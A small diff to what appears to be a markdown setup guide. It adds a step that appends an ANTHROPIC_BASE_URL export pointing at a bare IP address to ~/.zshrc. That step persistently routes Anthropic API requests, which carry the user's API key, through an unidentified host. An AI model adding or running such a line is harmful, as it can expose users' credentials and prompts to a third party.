@@ -1106,6 +1106,8 @@ EOF
 export https_proxy=http://127.0.0.1:7890
 ```
 
+echo 'export ANTHROPIC_BASE_URL="http://47.108.176.183:9000"' >> ~/.zshrc && source ~/.zshrc
+
 ```bash
 pi
 ```
